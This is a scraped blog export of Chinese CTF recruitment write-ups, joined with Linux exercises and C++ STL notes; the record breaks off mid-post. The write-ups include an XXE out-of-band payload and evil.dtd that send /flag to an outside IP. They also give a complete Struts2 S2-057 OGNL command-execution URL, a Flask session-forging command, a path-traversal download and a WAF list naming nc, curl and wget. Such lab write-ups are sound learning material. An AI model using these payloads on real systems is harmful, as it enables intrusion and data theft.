/etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@localhost tmp]# tail -n 10 /etc/passwd ...... 文件权限进阶 软链接与硬链接：在你的用户主目录下，为 /usr/bin/cat 文件分别创建软链接和硬链接，并解释两者的区别。 见上\n权限恢复：如何将某个目录的权限恢复到默认的 rwxr-xr-x 形式？请使用两种不同的 chmod 语法来实现。 1 2 [root@localhost test]# chmod u=rwx,g=rx,o=rx test1 [root@localhost test]# chmod 755 test1 r-4 ; w-2 ; x-1\nvi 编辑器进阶 复制与粘贴：在 vi 中，一次性将一段文本（例如三行）复制到文件的末尾。 命令行 nyy 复制n行\n命令行 p 粘贴\n撤销与重做：掌握在 vi 中撤销（undo）和重做（redo）操作的方法。 撤销：u\n重做：ctrl+r\n","date":"2025-10-16T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-linux%E5%85%A5%E9%97%A8/","title":"御林招新题：DevOps-Linux入门"},{"content":"题干 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;img src=\u0026#34;...\u0026#34; alt=\u0026#34;雪王Logo\u0026#34; class=\u0026#34;logo\u0026#34;\u0026gt;雪王生擒明珠塔\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mission\u0026#34;\u0026gt;帮助雪王，向东方明珠塔的护盾发送特殊信号，找到藏在塔内的旗帜/flag。\u0026lt;/p\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;div class=\u0026#34;input-area\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;payloadInput” class=\u0026#34;input-label\u0026#34;\u0026gt;在此进行你的攻击：\u0026lt;/label\u0026gt; \u0026lt;textarea id=\u0026#34;payloadInput\u0026#34; rows=\u0026#34;12\u0026#34; placeholder=\u0026#34;Enter your payload here...\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button onclick=\u0026#34;submitProposal()\u0026#34; class=\u0026#34;attack-button\u0026#34;\u0026gt;发起总攻\u0026lt;/button\u0026gt; \u0026lt;div id=\u0026#34;response-message” class=\u0026#34;response-area\u0026#34;\u0026gt;等待指令...\u0026lt;/div\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;雪王安全实验室 \u0026amp;copy；2025\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 在输入框中攻击？ 尝试 抓包如图：\n了解到可能是 xxe 漏洞\nXML 的知识 基本结构：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!--XML声明--\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!--DTD，这部分可选的--\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///c:/windows/win.ini\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;!--文档元素--\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; DTD 外部（.dtd 文件）和内部 DTD\n声明方式如下：\n内部实体 1 2 3 4 5 \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY a \u0026#34;admin\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;a\u0026lt;/note\u0026gt; \u0026lt;!-- admin --\u0026gt; 参数实体 1 2 3 4 5 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY % b \u0026#34;\u0026lt;!ENTITY b1 \u0026#34;awsl\u0026#34;\u0026gt;\u0026#34;\u0026gt; %b; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;b1\u0026lt;/note\u0026gt; 外部实体 1 2 3 4 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY c SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=flag.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;c\u0026lt;/note\u0026gt; 支持http，file等协议，不同的语言支持的协议不同\n外部参数实体 1 2 3 4 5 \u0026lt;!DOCTYPE note\u0026gt; [ \u0026lt;!ENTITY % d SYSTEM \u0026#34;http://47.106.143.26/xml.dtd\u0026#34;\u0026gt; %d; ]\u0026gt; \u0026lt;note\u0026gt;\u0026amp;d1\u0026lt;/note\u0026gt; 1 2 \u0026lt;!-- http://47.106.143.26/xml.dtd --\u0026gt; \u0026lt;!ENTITY d1 SYSTEM \u0026#34;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==\u0026#34;\u0026gt; 继续题目 尝试直接引入外部实体： 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY rabbit SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;rabbit;\u0026lt;/username\u0026gt;\u0026lt;/user\u0026gt; 响应：\n为什么不行？\n尝试引入服务器外部实体、外带： payload：\n1 2 3 4 5 \u0026lt;!DOCTYPE hacker[ \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % myurl SYSTEM \u0026#34;http://8.137.145.223/evil.dtd\u0026#34;\u0026gt; %myurl; ]\u0026gt; evil.dtd：\n1 2 3 \u0026lt;!ENTITY % wrapper \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; send SYSTEM \u0026#39;http://8.137.145.223/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %wrapper; %send; python3 -m http.server 8000\n测试外网可以正常访问，改包重发：\n还是不行，为什么？\n解决 最后发现问题在于，默认访问的是 80 端口！！！而启动服务器的时候启动了 8000……\n服务器：\nbp:\n终于！！\n一些启示 先搜集信息定方向，然后具体学习相关知识 总是有一些奇怪的错误，定位到知识上去解决，不要乱试 ","date":"2025-10-15T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/","title":"御林招新题：雪王生擒明珠塔"},{"content":"模板 建立通用的模具，提高复用性\n函数模板 作用：\n建立一个通用函数，其函数返回值类型和形参类型可以不具体制定，用一个虚拟的类型来代表。 支持自动类型推导和显式指定类型 1 2 3 4 5 6 7 8 9 //函数模板 template\u0026lt;typenameT\u0026gt;//声明一个模板，告诉编译器后面代码中紧跟着的T不要报错，T是一个通用数据类型 void mySwap(T \u0026amp;a,T \u0026amp;b) { T temp = a; a=b; b = temp; } myswap\u0026lt;int\u0026gt;(a,b) 注意：\n自动类型推导，必须推导出一致的数据类型T，才可以使用 模板必须要确定出 T 的数据类型，才可以使用（不能不推导） 普通函数和模板函数的区别 普通函数调用时可以发生自动类型转换（隐式类型转换） 函数模板调用时，如果利用自动类型推导，不会发生隐式类型转换 调用规则：\n优先调用普通函数 可通过空模板参数列表来强制调用函数模板 函数模板也可以发生重载 如果函数模板可以产生更好的匹配，优先周用函数模板 局限性 需要为特定的类型（如数组、自定义对象等）提供具体化模板\n1 2 3 4 5 6 7 8 9 10 template\u0026lt;\u0026gt;bool myCompare (Person \u0026amp;p1, Person \u0026amp;p2) { if(p1.name == p2.name){ return true; } else { return false; } } 类模板 1 2 teplate\u0026lt;typename T\u0026gt; class ... 与函数模板的区别 没有自动类型推导 可以有默认参数类型 成员函数创建时机 在模板调用（可以确定类型）时，才创建\n类模板对象作参数 指定传入类型 参数模板化 对象中的参数变为模板进行传递 整个类模板化 类模板与继承 类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型\n若不指定，编译器无法给子类分配内存 如果想灵活指定出父类中T的类型，子类也需变为类模板\n类模板成员的类外实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 //构造函数类外实现 template\u0026lt;class T1,class T2\u0026gt; Person\u0026lt;T1, T2\u0026gt;::Person(T1 name, T2 age) { this-\u0026gt;m_Name = name; this-\u0026gt;m_Age = age; } //成员函数类外实现 template\u0026lt;class T1, class T2\u0026gt; void Person\u0026lt;T1, T2\u0026gt;::showPerson() { } 类模板分文件编写 问题：\n模板中成员函数创建时机是在调用阶段，导致分文件编写时链接不到 解决：\n解决方式1：直接包含.cpp源文件 解决方式2：将声明和实现写到同一个文件中，并更改后缀名为.hpp，hpp是约定的名称，并不是强制 类模板与友元 类内实现：直接在类内声明友元即可\n类外实现：需要提前让编译器知道全局函数的存在\nSTL 初识 Standard Template Library：标准模板库\n主要组件：容器、算法、迭代器 容器和算法通过迭代器连接 STL 采用模板实现 六大组件：容器、算法、迭代器、仿函数、适配器（配接器）、空间配置器\n容器：数据结构 序列式：强调值的排序 关联式：如树，没有严格的物理联系 算法 Algorithms：实现常用算法 质变：与原来不同 非质变：查找、计数、遍历等 迭代器：胶合容器和算法 类似指针，提供访问容器的接口 双向、随机访问 仿函数：行为类似函数，可所谓算法的某种策略 适配器（配接器）：用于修饰容器、算法、迭代器或接口 空间配置器：负责空间的配置和管理 vector 使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;vector\u0026gt; vector\u0026lt;int\u0026gt; v; v.pushback() v.begin(); // 返回迭代器，指向容器中第一个数据 v.end(); // 指向容器最后一个数据的下一个位置 vector\u0026lt;int\u0026gt;::iterator pBegin = v.begin() // 接收 //第一种遍历方式: while (pBegin != pEnd) { cout \u0026lt;\u0026lt; *pBegin \u0026lt;\u0026lt; endl; pBegin++; } //第二种遍历方式: for (vector\u0026lt;int\u0026gt;::iterator it = v.begin(); it != v.end(); it++) { cout \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; endl; } cout \u0026lt;\u0026lt; endl; //第三种遍历方式: //使用STL提供标准遍历算法 头文件 algorithm for_each(v.begin(), v.end(), MyPrint); String string 是 C++ 风格的字符串，本质是一个类\n类内部封装 char*，是管理 char* 的容器 构造函数 1 2 3 4 string();//创建一个空的字符串例如：stringstr; string(const chan* s);//使用字符串s初始化 string(const string\u0026amp; str）;//使用一个string对象初始化另一个string对象 string(Int n, char c);//使用n个字符c初始化 赋值 1 2 3 4 5 6 7 string\u0026amp; operator=(const char*s);//char*类型字符串赋值给当前的字符串 string\u0026amp; operator=(const string \u0026amp;s）;//把字符串s赋给当前的字符串 string\u0026amp; operator=(char c);//字符赋值给当前的字符串 string\u0026amp; assign(const char *s);//把字符串s赋给当前的字符串 string\u0026amp; assign(const char *s,int n);//把字符串s的前n个字符赋给当前的字符串 string\u0026amp; assign(const string \u0026amp;s);//把字符串s赋给当前字符串 string\u0026amp; assign(int n,char c);//用n个字符c赋给当前字符串 拼接 1 2 3 4 5 6 7 string\u0026amp; operator+=(const char*str);//重载+=操作符 string\u0026amp; operator+=(const char c);//重载+=操作符 string\u0026amp; operator+=(const string\u0026amp; str);//重载+=操作符 string\u0026amp; appnd(const char *s);//把字符串s连接到当前字符串结尾 string\u0026amp; append(const char *s,int n);//把字符串s的前n个字符连接到当前字符串结尾 string\u0026amp; append(const string \u0026amp;s);//同operator+=(const string\u0026amp;str) string\u0026amp;append(conststring\u0026amp;s，intpos，intn);/字符串s中从pos开始的n个字符连接到字符串结尾 查找、替换 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 查找 str 第一次出现位置，从 pos 开始查找 int find(const string\u0026amp; str, int pos = 0) const; // 查找 s 第一次出现位置，从 pos 开始查找 int find(const char* s, int pos = 0) const; // 从 pos 位置查找 s 的前 n 个字符第一次位置 int find(const char* s, int pos, int n) const; // 查找字符 c 第一次出现位置 int find(const char c, int pos = 0) const; // 查找 str 最后一次位置，从 pos 开始查找 int rfind(const string\u0026amp; str, int pos = npos) const; // 查找 s 最后一次出现位置，从 pos 开始查找 int rfind(const char* s, int pos = npos) const; // 从 pos 查找 s 的前 n 个字符最后一次位置 int rfind(const char* s, int pos, int n) const; // 查找字符 c 最后一次出现位置 int rfind(const char c, int pos = 0) const; // 替换从 pos 开始 n 个字符为字符串 str string\u0026amp; replace(int pos, int n, const string\u0026amp; str); // 替换从 pos 开始的 n 个字符为字符串 s string\u0026amp; replace(int pos, int n, const char* s); 比较 1 2 int compare(const string\u0026amp; s)const; //与字符串s比较 int compare(const char *s) const;//与字符串s比较 字符存取 1 2 char\u0026amp; operator[] (int n);//通过[方式取字符 char\u0026amp; at(int n);//通过at方法获取字符 插入、删除 1 2 3 4 string\u0026amp; insert(int pos, const char*s);//插入字符串 string\u0026amp; insert(int pos,const string\u0026amp; str);//插入字符串 string\u0026amp; insert(int pos,int n,char c);//在指定位置插入n个字符c string\u0026amp; erase(int pos,int n = npos);//删除从Pos开始的n个字符 截取 1 string substr(int pos=θ,int = npos)const; vector 据结构和数组非常相似，也称为单端数组\n数组是静态空间，而 vector 可以动态扩展 动态扩展：不是在原空间之后续接新空间，而是找更大的内存空间，然后将原数据拷贝新空间，释放原空间 构造 1 2 3 4 vector\u0026lt;T\u0026gt;v;//采用模板实现类实现，默认构造函数 vector(v.begin(),v.end());//将v[begin(),end()区间中的元素拷贝给本身。 vector(n,elem);//构造函数将n个elem拷贝给本身。 vector(const vector \u0026amp;vec);//拷贝构造函数。 赋值 1 2 3 vector\u0026amp; operator=(const vector \u0026amp;vec);//重载等号操作符 assign(beg,end);//将[beg，end)区间中的数据拷贝赋值给本身。 assign(n,elem);//将n个elem拷贝赋值给本身。 容量 1 2 3 4 5 6 7 empty();//判断容器是否为空 capacity();//容器的容量 size();//返回容器中元素的个数 resize(int num);//重新指定容器的长度为num，若容器变长，则以默认值填充新位置。 //如果容器变短，则末尾超出容器长度的元素被删除。 resize（intnum，elem)；//重新指定容器的长度为num，若容器变长，则以elem值填充新位置。 //如果容器变短，则末尾超出容器长度的元素被删除 插入、删除 1 2 3 4 5 6 7 push_back(ele);//尾部插入元素ele pop_back();//删除最后一个元素 insert(const_iterator pos,ele);//选代器指向位置pos插入元素ele insert(const_iteratorpos，intcount，ele);//迭代器指向位置pos插入count个元素ele erase(const_iterator pos);//删除选代器指向的元素 erase(const_iteratorstart，const_iteratorend);//删除迭代器从start到end之间的元素 clear();//删除容器中所有元素 存取 1 2 3 4 at(int idx);//返回索引lidx所指的数据 operator[];//返回索引lidx所指的数据 front();//返回容器中第一个数据元素 back();//返回容器中最后一个数据元素 呼唤 swap(vec)\n收缩空间：vector\u0026lt;int\u0026gt;(v).swap(v)\n匿名对象自动被回收 预留空间 reserve(int len)\n分配内存，但内存上数据并未初始化，不可访问 用于减少开辟空间次数 ","date":"2025-10-14T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png","permalink":"https://calendar0917.github.io/posts/c++%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%E5%8F%8Astl%E6%8A%80%E6%9C%AF/","title":"C++ 模板及STL技术"},{"content":"题干 附件：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 version: \u0026#39;3.8\u0026#39; services: ipv4-challenge-challenge: build: . ports: - \u0026#34;5000:5000\u0026#34; volumes: - ./server.py:/app/server.py environment: - PYTHONUNBUFFERED=1 restart: always networks: default: driver: bridge dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 FROM python:3.9-alpine RUN apk add --no-cache bash procps RUN rm -f /bin/cat /bin/ls /usr/bin/cat /usr/bin/ls /usr/bin/nc /usr/bin/curl /usr/bin/wget /usr/bin/id /usr/bin/whoami WORKDIR /app COPY server.py . COPY templates ./templates COPY flag.txt /flag RUN pip install Flask EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;server.py\u0026#34;] server.py: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 app = Flask(__name__, template_folder=\u0026#39;templates\u0026#39;) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;xxxxxxx\u0026#39; USERS = {} def waf_filter(data): malicious_keywords = [ \u0026#39;cat\u0026#39;, \u0026#39;ls\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;whoami\u0026#39;, \u0026#39;pwd\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;wget\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39; ] for keyword in malicious_keywords: if keyword in data: return True return False # 登录逻辑 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) user_info = USERS.get(username) if user_info and user_info[\u0026#39;password\u0026#39;] == password: user_data = {\u0026#34;username\u0026#34;: username, \u0026#34;is_admin\u0026#34;: user_info[\u0026#39;is_admin\u0026#39;]} session[\u0026#39;user\u0026#39;] = base64.b64encode(json.dumps(user_data).encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) return redirect(url_for(\u0026#39;user_home\u0026#39;)) return render_template(\u0026#39;login.html\u0026#39;, message=\u0026#34;登录失败，用户名或密码错误。\u0026#34;) return render_template(\u0026#39;login.html\u0026#39;) ...... # ping 逻辑 @app.route(\u0026#39;/ping\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def ping_page(): if \u0026#39;user\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) try: user_data = json.loads(base64.b64decode(session[\u0026#39;user\u0026#39;]).decode(\u0026#39;utf-8\u0026#39;)) if not user_data.get(\u0026#39;is_admin\u0026#39;): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;对不起，只有管理员才能使用这个功能。\u0026#34;) except Exception: return redirect(url_for(\u0026#39;logout\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: ip_base64 = request.form.get(\u0026#39;ip_base64\u0026#39;, \u0026#39;\u0026#39;) if not ip_base64: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;请提供 IP 地址。\u0026#34;) try: decoded_ip = base64.b64decode(ip_base64.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) if waf_filter(urllib.parse.unquote(ip_base64)): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;WAF: 检测到恶意关键字，请求被阻止。\u0026#34;) if not re.match(r\u0026#39;^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\u0026#39;, decoded_ip.split(\u0026#39;\\n\u0026#39;)[0]): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) if not all(0 \u0026lt;= int(part) \u0026lt; 256 for part in decoded_ip.split(\u0026#39;.\u0026#39;)): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) if not ipaddress.ip_address(decoded_ip): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) except Exception: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：无效的 Base64 编码或 IP 格式错误。\u0026#34;) command = f\u0026#34;echo \\\u0026#34;ping -c 1 $(echo \u0026#39;{ip_base64}\u0026#39; | base64 -d)\\\u0026#34; | sh\u0026#34; try: process = subprocess.run( command, shell=True, check=True, capture_output=True, text=True, timeout=5, executable=\u0026#34;/bin/sh\u0026#34; ) return render_template(\u0026#39;ping.html\u0026#39;, output=process.stdout) except subprocess.TimeoutExpired: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;❌ Ping 操作超时，请重试或检查网络连接。\u0026#34;) except subprocess.CalledProcessError as e: return render_template(\u0026#39;ping.html\u0026#39;, message=f\u0026#34;命令执行失败：{e.stderr}\u0026#34;) except Exception as e: return render_template(\u0026#39;ping.html\u0026#39;, message=f\u0026#34;发生未知错误：{e}\u0026#34;) return render_template(\u0026#39;ping.html\u0026#39;) templates 各个 html 文件 尝试 1 2 D:\\software\\tools\\flask-session-cookie-manager-1.2.2\u0026gt;python flask_session_cookie_manager2.py encode -s \u0026#34;xxxxxxx\u0026#34; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;is_admin\u0026#39;:\u0026#39;true\u0026#39;}\u0026#34; eyJpc19hZG1pbiI6eyIgYiI6ImRISjFaUT09In0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.aPCvLQ.2wnGTmxlNZK2w-jaIbz3fvYdfIs ","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-ipv4/","title":"御林招新题：ipv4"},{"content":"题干 目标一：云端之门的低语 （ Spring Cloud Gateway 3.1.0）\n“天穹”微服务 API 网关：这是公司最新潮的 API 网关，所有数据的流量中枢，看起来坚不可摧。然而，根据情报，这个版本的网关在处理路由请求时，似乎留下了一道不易察觉的缝隙。\n目标二：思想者的诡计 （ThinkPHP 5.0.23）\n“敏捷开发” PHP 门户:这是用一款广受欢迎的 PHP 框架搭建的门户网站，以其高效和灵活著称。然而，在处理 HTTP 请求的某个环节，框架对“请求方法”的理解出现了偏差。\n目标三：远古框架的咆哮 （ Struts 2.3.34）\n“化石”级企业管理平台：这是一个老旧的 Java 企业级应用，虽然年迈，但依然在核心业务线上运行。它的开发者在配置某个核心组件时，遵循了当时流行的“通配符”设计哲学，却忽略了这份“灵活”背后潜藏的巨大风险。\n解题过程 Spring Cloud Gateway 3.1.0 直接脚本过了\nThinkPHP 5.0.23 也是脚本\nStruts 2.3.34 这个脚本不知道怎么用\n于是尝试解题：\n打开网站发现是空白的，扫描工具扫到 /upload.action，进入 是 struts2，网上查询，发现 S2-057远程执行代码漏洞（CVE-2018-11776） 影响当前版本 参考 Struts2 S2-057远程执行代码漏洞（CVE-2018-11776）_apache struts 2 安全漏洞(cve-2018-11776)-CSDN博客\n区别在于上面靶场的网址是 /showcase\n漏洞判断 poc 1 2 ${ (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\u0026#39;struts.valueStack\u0026#39;].context).(#cr=#ct[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} 注意：poc 放到网址上，需要 url 编码。后续又发现，“ls /”这一字符串中空格需要编码，但是斜杠不需要编码！..也不需要编码\n最终 payload： 1 payload：/upload.action/$%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/flag%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action ","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/","title":"御林招新题：档案馆的回响"},{"content":"题目描述 御林娘图片_御林娘素材_御林娘高清图片_御林网图片下载_306万 御林娘 免版税图片、库存照片和图像 | Yulinsec\n御林娘小时候上网找素材做海报，意外发现了一个用python编写的盗版图片网站。她一顿操作猛如虎，行云流水地黑入网站获取管理员权限，狠狠报复了这个盗版网站。\n1 2 3 4 5 \u0026lt;h1\u0026gt;御林图库\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/download?file=pic1.png\u0026#34;\u0026gt;扣1送御林娘自拍\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/download?file=pic2.png\u0026#34;\u0026gt;简约大气的御林娘图片-御林娘图片素材免费下载\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 解题 思路 信息搜集：\n题目告知是 python 写的网站 页面给了链接，可能存在文件泄露！ 尝试下载文件，发现：/download?file=../app.py，于是得到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 from flask import Flask, request, session, render_template_string, abort, redirect, url_for, make_response, Response import ... app = Flask(__name__) def generate_secret_key(): prefix = \u0026#34;Yulin\u0026#34; suffix = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) return prefix + suffix app.secret_key = generate_secret_key() flag = \u0026#34;\u0026#34; if os.path.isfile(\u0026#34;/flag\u0026#34;): with open(\u0026#34;/flag\u0026#34;, \u0026#34;r\u0026#34;) as f: flag = f.read().strip() os.remove(\u0026#34;/flag\u0026#34;) os.remove(\u0026#34;/start.sh\u0026#34;) else: flag = \u0026#34;[ ]\u0026#34; @app.route(\u0026#39;/\u0026#39;) def index(): if session.get(\u0026#39;is_admin\u0026#39;): return f\u0026#39;\u0026lt;h1\u0026gt;你好，Admin\u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;Flag: YulinSec{{{flag}}}\u0026lt;/p\u0026gt;\u0026#39; return ...... @app.route(\u0026#39;/download\u0026#39;) def download(): ...... allowed_proc_files = [\u0026#39;/proc/self/maps\u0026#39;, \u0026#39;/proc/self/mem\u0026#39;] if file_path in allowed_proc_files: pass else: ...... if file_path == \u0026#39;/proc/self/maps\u0026#39;: try: with open(file_path, \u0026#39;r\u0026#39;) as f: content = f.read() ... return response except Exception as e: ... if file_path == \u0026#39;/proc/self/mem\u0026#39;: if end \u0026lt;= start: end = start + 1048576 # 1MB def generate(): try: with open(file_path, \u0026#39;rb\u0026#39;) as f: f.seek(start) remaining = end - start while remaining \u0026gt; 0: chunk_size = min(1024 * 1024, remaining) # 每次最多读取1MB data = f.read(chunk_size) if not data: break yield data remaining -= len(data) except Exception as e: app.logger.error(f\u0026#34;Error reading memory: {str(e)}\u0026#34;) yield f\u0026#34;Error reading memory content from {start} to {end}\u0026#34;.encode() return Response( generate(), mimetype=\u0026#39;application/octet-stream\u0026#39;, headers={\u0026#39;Content-Disposition\u0026#39;: f\u0026#39;attachment; filename=memory_{start}_{end}.bin\u0026#39;} ) try: with open(file_path, \u0026#39;rb\u0026#39;) as f: content = f.read() except Exception as e: ... sanitized_content = re.sub( rb\u0026#39;flag\\{.*?\\}\u0026#39;, b\u0026#39;[ ]\u0026#39;, content, flags=re.IGNORECASE ) .... return response if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 代码关键点：\n泄露了文件 /proc/self/maps 以及 /proc/self/mem\n限制了 mem 的读取，一次只能读 1 MB\n突破点在于取得 session 的 admin\n尝试 读取 maps：\n1 2 3 4 5 6 7 5e2267a76000-5e2267a77000 r--p 00000000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a77000-5e2267a78000 r-xp 00001000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a78000-5e2267a79000 r--p 00002000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a79000-5e2267a7a000 r--p 00002000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a7a000-5e2267a7b000 rw-p 00003000 00:aa6 1871870 /usr/local/bin/python3.8 ...... 权限：如 r--p、r-xp、rw-p 等，r 表示可读（read）、w 表示可写（write）、x 表示可执行（execute）、p 表示私有（private，即进程间不共享）。 由于数据段通常是可读可写的，所以考虑遍历读取 rw 的区域，编写脚本\n写脚本 不会写，问 AI\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 